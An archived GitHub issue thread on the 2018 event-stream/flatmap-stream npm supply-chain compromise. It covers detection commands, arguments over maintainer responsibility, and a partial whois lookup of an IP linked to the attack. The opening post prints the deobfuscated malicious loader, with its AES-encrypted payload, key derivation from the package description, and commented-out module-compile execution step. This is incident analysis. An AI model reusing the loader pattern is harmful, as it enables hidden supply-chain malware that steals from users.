---
url: "https://github.com/dominictarr/event-stream/issues/116"
title: "I don't know what to say. · Issue #116 · dominictarr/event-stream"
site: "GitHub"
captured: "2026-11-02T18:52:25Z"
via: "live"
sha256: "537782acc159ee950e61826b09c9df9d98c3d33a3050347c7fbd4575f1bb8200"
wayback: "https://web.archive.org/web/20261009222734/https://github.com/dominictarr/event-stream/issues/116"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# I don't know what to say. · Issue #116 · dominictarr/event-stream

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://github.com/dominictarr/event-stream/issues/116>
> Snapshot: <https://web.archive.org/web/20261009222734/https://github.com/dominictarr/event-stream/issues/116>

This repository was archived by the owner on Nov 28, 2018. It is now read-only.

## Repository navigation

This repository was archived by the owner on Nov 28, 2018. It is now read-only.

# I don't know what to say. #116

Closed

[peerigon/parse-domain

#57](https://github.com/peerigon/parse-domain/pull/57)

Closed

[I don't know what to say.](https://github.com/dominictarr/event-stream/issues/116#top)#116

[peerigon/parse-domain

#57](https://github.com/peerigon/parse-domain/pull/57)

## Description

https://github.com/FallingSnow

[FallingSnow](https://github.com/FallingSnow)

opened [on Nov 20, 2018](https://github.com/dominictarr/event-stream/issues/116#issue-382854428)

EDIT 26/11/2018:

-

Am I affected?:
If you are using anything crypto-currency related, then maybe. As discovered by [@maths22](https://github.com/maths22), the target seems to have been identified as copay related libraries. It only executes successfully when a matching package is in use (assumed to be copay at this point). If you are using a crypto-currency related library and if you see flatmap-stream@0.1.1 after running npm ls event-stream flatmap-stream, you are most likely affected. For example:

```
$ npm ls event-stream flatmap-stream
...
flatmap-stream@0.1.1
...

```

-

What does it do:
Other users have done some good analysis of what these payloads actually do.

- [I don't know what to say. #116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047)
- [I don't know what to say. #116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441746370)
- [I don't know what to say. #116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441749105)

-

What can I do:
By this time fixes are being deployed and npm has yanked the malicious version. Ensure that the developer(s) of the package you are using are aware of this post. If you are a developer update your event-stream dependency to event-stream@3.3.4. This protects people with cached versions of event-stream.

[@dominictarr](https://github.com/dominictarr) Why was [@right9ctrl](https://github.com/right9ctrl) given access to this repo? He added [flatmap-stream](https://github.com/hugeglass/flatmap-stream) which is entirely (1 commit to the repo but has 3 versions, the latest one removes the injection, unmaintained, created 3 months ago) an injection targeting [ps-tree](https://github.com/indexzero/ps-tree). After he adds it at almost the exact same time the injection is added to flatmap-stream, he bumps the version and publishes. Literally the second commit (3 days later) after that he removes the injection and bumps a major version so he can clear the repo of having flatmap-stream but still have everyone (millions of weekly installs) using 3.x affected.

[@right9ctrl](https://github.com/right9ctrl) If you removed flatmap-stream because your realized it was an injection attack why didn't you yank event-stream@3.3.6 from npm and put a PSA? If you didn't know, why did you choose to use a completely unused/unknown library (0 downloads on npm until you use it)? If I had the exact date from npm in which flatmap-stream@0.1.1 was published I wouldn't be asking you questions.

I've included a break down of what I have so far on flatmap-stream below. It includes the portion of code not found in the unminified source of flatmap-stream@0.1.1 but found in the minified source. The code has been cleaned up a little to get a better understanding.

The worst part is I still don't even know what this does... The decrypted data n[0] is byte code or something, not regular javascript, or maybe I'm just not handling it correctly.

```
// var r = require, t = process;

// function e(r) {
//     return Buffer.from(r, "hex").toString()
// }
function decode(data) {
    return Buffer.from(data, "hex").toString()
}

// var n = r(e("2e2f746573742f64617461")),
// var n = require(decode("2e2f746573742f64617461"))
// var n = require('./test/data')
var n = ["75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629","db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"]
    // o = t[e(n[3])][e(n[4])];
    // npm_package_description = process[decode(n[3])][decode(n[4])];
    // npm_package_description = process['env']['npm_package_description'];
    npm_package_description = 'Get all children of a pid'; // Description from ps-tree (this is the aes decryption key)

// if (!o) return;
if (!npm_package_description) return;

// var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
// var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
var decipher = require('crypto')['createDecipher']('aes256', npm_package_description),

    // a = u.update(n[0], e(n[8]), e(n[9]));
    // decoded = decipher.update(n[0], e(n[8]), e(n[9]));
    decoded = decipher.update(n[0], 'hex', 'utf8');

console.log(n); // IDK why this is here...

// a += u.final(e(n[9]));
decoded += decipher.final('utf8');

// var f = new module.constructor;
var newModule = new module.constructor;

/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/
// f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
// newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])
// newModule.paths = module.paths
// newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename)
// newModule.exports(n[1])
```

Reacted by Jayden Seric, mashaal, Limon Monte, Kari Söderholm, Laurynas Ragauskas, Martijn Cuppens, azu, Toru Nagashima, momota, Haoqun Jiang and 1055 more

Reacted by jsloverperson, onkeep, Giuseppe Mandato, Cailin Pitt and vdyalex

Reacted by Philipp Gayret, Andy Gu, garkin, LeoTM, Lyra Rebane, zseha, Drew Dennison, Daniel Kosiński, Valentin Tjoncke, Vlad and 173 more

Reacted by Oliver Blanthorn, thiagolopes, James Hong, swedneck, Cuzkey, Ashwin S, Erik Zigo, Christian Weiske, Christian Kulpa, Nic and 76 more

Reacted by pavel, Jeremy Cole, Nathanial P. Howard, Julio M, Matt Parker, André de Lannoy Tavares, David Wong, Luiz Picanço, Jean Barkhuysen, Karen West and 151 more

Reacted by Darien Maillet Valentine, Aaron, zseha, Fiona, Eugene C., Jeremy Morrell, Vlad, Christian Genco, paulogdm, Mac Pham and 124 more

## Activity

-

### jaydenseric commented on Nov 21, 2018

https://github.com/jaydenseric

[jaydenseric](https://github.com/jaydenseric)

[on Nov 21, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440842449)

[@FallingSnow](https://github.com/FallingSnow) did you manage to work out what the attack does?

Reacted by Christian Bundy, CJ Thompson, matt, Pat Myron, DiamondYuan, Jon Pastore, praphan-wlr, Henry, Vincenzo Ferrari, maziarz and 9 more

Reacted by Keenwon, Deamonish, maziarz and Halid Cisse

-

### FallingSnow commented on Nov 21, 2018

https://github.com/FallingSnow

[FallingSnow](https://github.com/FallingSnow)

[on Nov 21, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440850126)

Author

No. I spent a better part of a day trying to get something other than gibberish out of the encrypted AES payload. I've tried executing the gibberish and it errors out.

I believe there are 2 possible reasons I haven't been able to get the actual payload's code.

- I might not be using the correct passphrase. Even though the description for ps-tree is the only passphrase that actually successfully decrypts the encrypted payload, it may still not be the correct passphrase.
- I'm using an invalid charset with the payload?

Reacted by Christian Bundy, Antti K. Koskela, CJ Thompson, Henry C. Wong, jkmdev, Norbert de Langen, Evgeniy Timokhov, ExE Boss, Gabriel Melo Correia, Peter Petrov and 14 more

-

### jaydenseric commented on Nov 21, 2018

https://github.com/jaydenseric

[jaydenseric](https://github.com/jaydenseric)

[on Nov 21, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440851880)

unpkg link to help other people poke around: https://unpkg.com/flatmap-stream@0.1.1/index.min.js

Reacted by Christian Bundy, Osvaldo, ean, Bruno Scheufler, Konrad Iturbe, Sean Miller, Harris Thompson, Henry C. Wong, Joe Graham, Pat Myron and 10 more

-

### dominictarr commented on Nov 22, 2018

https://github.com/dominictarr

[dominictarr](https://github.com/dominictarr)

[on Nov 22, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440927400)

Owner

he emailed me and said he wanted to maintain the module, so I gave it to him. I don't get any thing from maintaining this module, and I don't even use it anymore, and havn't for years.

Reacted by Wes Cook, Adelar da Silva Queiróz, squaresmile, Deep Patel, Ashley Connor, Silou, Matthew Schwartz, Nelson, Brent Vatne, Andrew Stevens and 334 more

Reacted by John Haugeland, Gorantla Krishna, Dharma Bellamkonda, William Boman, Mariusz, miguel, Andrea Parodi, Alex, novwhisky, Vincent Marquet and 568 more

Reacted by Jacek Królikowski, Justin Tamblyn, Bob Whitelock, Will Morgan, Valérianne, Andrii Sokolovskyi, Vlad, Casey Hall, Gonçalo Pestana, Dmitry Slutsky ‮ ‮ and 167 more

Reacted by KevinHock, Larry, Matt Joyce, Darien Maillet Valentine, Paul Morrison, Philip Zaengle, thiagolopes, JurjDev, ThisIsWebGoat, Kostya Serebryany and 50 more

Reacted by Mathias Bynens, uzantnomo, Adrian Parker, Reid Parham, asu, Kobi, Golo Roden, Fabio Neves, Mario Pabon, Ringo and 100 more

Reacted by Khoa Nguyen, Andrew Conti, Val Packett, Wes Cook, Diego Rodriguez, Deep Patel, Gangstead, David Leuliette, Martin Splitt, eliza and 125 more

-

### dominictarr commented on Nov 22, 2018

https://github.com/dominictarr

[dominictarr](https://github.com/dominictarr)

[on Nov 22, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440927579)

Owner

note: I no longer have publish rights to this module on npm.

Reacted by Caleb Rogers, ☁️淡然, Poddster, Vinayak Kulkarni, fbo3264, Artur Gomes, rafaelcseventh, Armin, Saleh Alghusson, Przemysław Chojecki and 7 more

Reacted by Jakub Kowalczyk, Santhosh, jasonjcpeng, thebigdalt, Jordie Bodlay, Relign, darron, Cal Freitas, Patrick Wu, zhangyun and 50 more

Reacted by Limon Monte, Gavin Gassmann, Brian Kim, 三三, Luong Vo, Steven Bentley, Benjamin San Souci, zseha, Craig Hooghiem, soulchild and 132 more

Reacted by Brian Kim, Dan, Ishmael Rufus, Pratik Zambani, Wareya, Kaixi Luo, Nathanial P. Howard, rabi-penguinpay, Aliaksandr Ushakou, Dorian Marchal and 29 more

Reacted by Pat Myron, Andrew Joslin, Steven, Adrian Parker, Mathias Bynens, Cezar “ikari” Pokorski, codetrotter, Pratik Zambani, Pascal Hartig, Jeremiah Senkpiel and 91 more

Reacted by Christian Bundy, Rafael Carício, Braden Schaeffer, Jamie, Alexey M., Haroen Viaene, Philip Jackson, lw, Arran France, HaveF and 8 more

-

### XhmikosR commented on Nov 22, 2018

https://github.com/XhmikosR

[XhmikosR](https://github.com/XhmikosR)

[on Nov 22, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440929203)

Please contact npm support and they will take care of the situation.

Reacted by Jayden Seric, Limon Monte, Robert Jones, Kevin Chavez, Roy Tinker, Pat Myron, Gonçalo Morais, Tauno Talimaa, Matt, Justin Dorfman and 91 more

Reacted by Federico Ceratto, Adrian Parker, MrSapps, Poddster, Denis Kolodin, Sándor Kazi, Mirhossein Mousavi and David Vuong

Reacted by Gerson Revatta and KevinHock

-

### limonte commented on Nov 22, 2018

https://github.com/limonte

[limonte](https://github.com/limonte)

[on Nov 22, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440947083)

note: I no longer have publish rights to this module on npm.

```
npm owner ls event-stream

right9ctrl <right9ctrl@outlook.com>
```

Transfer publishing rights to the unknown dude, but keep the repo under your username. Well done, mate 👍

Reacted by nextgenthemes, necevil, Deep Patel, Tim Zaman, Matt Scheurich, Vincent Marquet, Abhishek Hingnikar, df, Mattia Tezzele, Seth Miller and 311 more

Reacted by tumdum, tomasz stryjewski, Jacob Weisz, magneto-was-right, Wes Cook, Adelar da Silva Queiróz, Vince Martinez, Alex, Zane Starr, warnerAWESOMEmoore and 142 more

Reacted by Brian Kim, annedroiid, shak-thalmic, Akshay Patil, Davis Silverman, Caio Bianchi, Yeyo, Nischay Maridevegowda, Chris MacNaughton, Josh Varty and 210 more

Reacted by Chris, Vlad, rabi-penguinpay, Tyler Wack, Antonio Bonifacio, Eivind Lindbråten, Emil V, franeklubi, Boy Callaars, Max Fenton and 30 more

Reacted by Antonio Bonifacio, Ringo , Russ Cartwright, Jonathan Frias, Aaron S. Hawley, Mehdi A., Kristopher Read, Gabriel Montes, Adam Demasi, Luke Rossy and 31 more

Reacted by KevinHock

-

### dominictarr commented on Nov 22, 2018

https://github.com/dominictarr

[dominictarr](https://github.com/dominictarr)

[on Nov 22, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441116734)

Owner

[@limonte](https://github.com/limonte) I tried to transfer it to [@right9ctrl](https://github.com/right9ctrl) but github errored because they already had a fork of it at [http://github.com/right9ctrl/event-stream](https://github.com/right9ctrl/event-stream)

If you guys feel strongly about this, why don't you volunteer to maintain it and contact npm support?

Reacted by Alan Franzoni, Paul Reinheimer, floatingatoll, Thierry Schellenbach, Jess, Arve Seljebu, magneto-was-right, Sajit Mathew Kunnumkal, Atanas Bozhkov, Wes Cook and 447 more

Reacted by Limon Monte, Jayden Seric, Jack Allnutt, Damo, Daniel Arno George Koehler, Kev Wilson, Joshua Buck-Rogers, Richard Hesketh, Leo Cassarani, Jason Swindle and 212 more

Reacted by pugson, Assaf Morami, Inal Kardan, Leon Fedotov, Tarik Lafi, Ben, Arran France, Eric Yuan, Tomasz Galkowski and Adam Rackis

Reacted by KevinHock

Reacted by <~miako>, Pat Myron, Vincent Vermilya, Erick Chavez, Pilaf T. Pilafian, lacksfish, Florian Husquinet and Julian Bonomini (Buenomini)

Reacted by Alexander Shapiotko, KevinHock, Scott Sheffield, Alan Yee, Boris Bügling, Paul Morrison, William Pietri, Kamal Nasser, Lauri Härsilä, Florian Zinggeler and 45 more

-

### jaydenseric commented on Nov 23, 2018

https://github.com/jaydenseric

[jaydenseric](https://github.com/jaydenseric)

[on Nov 23, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441135981)

To know if your project is in danger, run:

```
npm ls event-stream flatmap-stream

```

The bad actor has publishing rights to event-stream and flatmap-stream contains the malicious code (specifically flatmap-stream@0.1.1, but any future version can't be trusted).

Here is an example result from one of my projects:

```
[redacted]
└─┬ npm-run-all@4.1.3
  └─┬ ps-tree@1.1.0
    └─┬ event-stream@3.3.6
      └── flatmap-stream@0.1.2

```

Reacted by H, david, Moritz Schmale, krinoid, Kevin Chavez, Scott, Mark Woosey, Seth Davenport, Đào Hoàng Sơn, Alex and 156 more

Reacted by Poddster and Keishon Smith

Reacted by david, Seth Davenport, Adam Faulconbridge, Roneesh, Garrett Dehnke-Turpin, Jason Stathopulos, Robin Law, Jemma Nelson, Peter Chapman, Glen Hughes and 25 more

-

### XhmikosR commented on Nov 23, 2018

https://github.com/XhmikosR

[XhmikosR](https://github.com/XhmikosR)

[on Nov 23, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441161123)

[@dominictarr](https://github.com/dominictarr): although I completely disagree with someone else contacting npm support, I contacted npm support myself for now.

You put at risk millions of people, and making something for free, but public, means you are responsible for the package.

Anyway, I don't want to argue about this, I just want the issue to be solved, because this is a popular package.

Reacted by Jayden Seric, Limon Monte, Kevin Chavez, Mark Woosey, Mehdi Hasan Khan, Mike Clifford, David Ferenczy Rogožan, annedroiid, Sean Soper, Aviad Hadad and 217 more

Reacted by tumdum, Valentin Tjoncke, doomy [archive], Jonathan Curran, Eldar Chamoukhamedov, Pierre Bourdon, simon-tamman, Callam, S.P., Gleb Mikheev and 499 more

Reacted by Poddster and Tanzeel

Reacted by Ramiro and Cailin Pitt

Reacted by Larry, lllusion3469, Nathaniel Wesley Filardo, André Neves, Jiji Freya Daniel Maslowski, Francisco Presencia, Felipe Mica, Paul Taykalo, Sunny Ripert, James Greenaway and 2 more

Reacted by Martijn Cuppens, Steven Humphrey, Kev Wilson, Kevin Chavez, shak-thalmic, Josh Myers, Gleb Mikheev, warnerAWESOMEmoore, Tauno Talimaa, David Poindexter and 20 more

-

### limonte commented on Nov 23, 2018

https://github.com/limonte

[limonte](https://github.com/limonte)

[on Nov 23, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441175168)

If you guys feel strongly about this, why don't you volunteer to maintain it and contact npm support?

[@dominictarr](https://github.com/dominictarr) Apparently, you don't want to take any responsibility for this package. That's fine, it's the free community, do whatever you want. But at least indicate somehow that you're not maintaining this repo anymore, e.g. [archive the repo](https://help.github.com/articles/archiving-a-github-repository/)

When you archive a repository, you are letting people know that a project is no longer actively maintained.

Reacted by Kevin Chavez, Scott, Mehdi Hasan Khan, Mike Clifford, annedroiid, Shun Liang, omaksi, Val Packett, KittenWithHerbs, simon-tamman and 426 more

Reacted by Carlos Vergara, Christian Bundy, max-pt, Benjamin Juang, izogain, David Mikalova, Anthony Ciccarello, Martijn Hols, Gregg Caines, Antoine Motet and 29 more

Reacted by Poddster

Reacted by Maarten de Boer

-

### jaydenseric commented on Nov 23, 2018

https://github.com/jaydenseric

[jaydenseric](https://github.com/jaydenseric)

[on Nov 23, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441204838)

There is a huge difference between not maintaining a repo/package, vs giving it away to a hacker (which actually takes more effort than doing nothing), then denying all responsibility to fix it when it affects millions of innocent people.

Reacted by Limon Monte, XhmikosR, H, Edward Yerburgh, Jack Palmer, Matthew Jones, Steven Humphrey, Kev Wilson, Sam Collard, spookyuser and 864 more

Reacted by Carlos Vergara, timothy, Christian Bundy, max-pt, Blaž Hrastnik, Vincelwt, codetrotter, BonesyWonesy, Benjamin Juang, Corey Farwell and 149 more

Reacted by Corentin Jemine, Chuck Housley, Debajyoti Bhaumik, Sándor Kazi, vdyalex, Dani Hodovic and Zack Morgenthaler

Reacted by Wes Cook, Philip Zaengle, Ryan Conlon, Kinnardian, Russell Garner, Artur G Vieira, Nick Webster, amy null, Aloïs de Gouvello, Sunny Ripert and 6 more

Reacted by franeklubi, Philip Zaengle, Johnny Santos, Chris Cooper, David Zech, Wagner, Gabriel Montes, Dan Alvidrez, Jaggy, Nick Groenen and 8 more

-

[ChrisBAshton](https://github.com/ChrisBAshton)

added 3 commits that reference this issue [on Nov 26, 2018](https://github.com/dominictarr/event-stream/issues/116#event-1986538546)

[replaces npm-run-all with concurrently](https://github.com/bbc/simorgh/commit/71eb5e27b38b70137130b27726affef82e2f5ae9)

[71eb5e2](https://github.com/bbc/simorgh/commit/71eb5e27b38b70137130b27726affef82e2f5ae9)

[lock event-stream to 3.3.4](https://github.com/bbc/simorgh/commit/34dd2fa0de8eb7ffee23d00d759166b7a8f76e2a)

[34dd2fa](https://github.com/bbc/simorgh/commit/34dd2fa0de8eb7ffee23d00d759166b7a8f76e2a)

[upgrade npm-run-all to v4.1.5](https://github.com/bbc/simorgh/commit/dcd98bf6f6ecf66d559e24b4c03b47958f5d2d3b)

[dcd98bf](https://github.com/bbc/simorgh/commit/dcd98bf6f6ecf66d559e24b4c03b47958f5d2d3b)

-

### 711 remaining items

-

### haykam821 commented on Nov 27, 2018

https://github.com/haykam821

[haykam821](https://github.com/haykam821)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442226650)

Yup, that's definitely not trivial. It's good code!

```
const fs = require("fs-extra");
fs.readFile(require.resolve("event-stream/index.js")).then(content => {
    const lines = content.split("\n");
    console.log(lines.filter(line => {
        return !line.trim().startsWith("//");
    }).length);
});
```

-

### N3X15 commented on Nov 27, 2018

https://github.com/N3X15

[N3X15](https://github.com/N3X15)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442230621)

Yup, that's definitely not trivial. It's good code!

```
const fs = require("fs-extra");
fs.readFile(require.resolve("event-stream/index.js")).then(content => {
    const lines = content.split("\n");
    console.log(lines.filter(line => {
        return !line.trim().startsWith("//");
    }).length);
});
```

Would likely involve AST traversal if you really want a more solid approach.

Reacted by fent and ExE Boss

-

### rockia commented on Nov 27, 2018

https://github.com/rockia

[rockia](https://github.com/rockia)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442230709)

Github user [@right9ctrl](https://github.com/right9ctrl) was either removed by GitHub or he just removed/renamed himself but so far I have not seen anything from this person. I still believe this is intentional.

Reacted by Jeffrey Walton and ExE Boss

-

### planeguy commented on Nov 27, 2018

https://github.com/planeguy

[planeguy](https://github.com/planeguy)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442232034)

Too late, <blink> is deprecated....

<marquee> still works

Reacted by ExE Boss

Reacted by ExE Boss

-

### morenoh149 commented on Nov 27, 2018

https://github.com/morenoh149

[morenoh149](https://github.com/morenoh149)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442233177)

I know there is cyclomatic complexity. Plus a lower bound like 30 lines would allow those interested in avoiding modules that are "too small".

-

### eirslett commented on Nov 27, 2018

https://github.com/eirslett

[eirslett](https://github.com/eirslett)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442233825)

What do you think about a solution like this?
https://medium.com/@eiriksletteberg/a-proposition-to-collectively-security-audit-the-most-used-npm-packages-36ed8cbc1f8d

Reacted by Jed Fox, Zack Morgenthaler and ExE Boss

-

### theonlyjeronimo commented on Nov 27, 2018

https://github.com/theonlyjeronimo

[theonlyjeronimo](https://github.com/theonlyjeronimo)

[on Nov 27, 2018](https://github.com/dominictarr/event-stream/issues/116#issuecomment-442250610)

Whois for 111.90.151.134:

```
$ whois 111.90.151.134
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '111.90.128.0 - 111.90.159.255'

% Abuse contact for '111.90.128.0 - 111.90.159.255' is 'abuse@shinjiru.com.my'

inetnum:        111.90.128.0 - 111.90.159.255
netname:        SHINJIRU-MY
descr:          Shinjiru Technology Sdn Bhd
country:        MY
admin-c:        STSB2-AP
tech-c:         STSB2-AP
country:        MY
org:            ORG-STSB2-AP
status:         ALLOCATED PORTABLE
mnt-by:         APNIC-HM
mnt-lower:      MAINT-SHINJIRU-MY
mnt-routes:     MAINT-SHINJIRU-MY
mnt-irt:        IRT-SHINJIRU-MY
last-modified:  2018-01-11T13:04:14Z
source:         APNIC

irt:            IRT-SHINJIRU-MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
e-mail:         abuse@shinjiru.com.my
abuse-mailbox:  abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
auth:           # Filtered
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:35Z
source:         APNIC

organisation:   ORG-STSB2-AP
org-name:       Shinjiru Technology Sdn Bhd
country:        MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
phone:          +60320318850
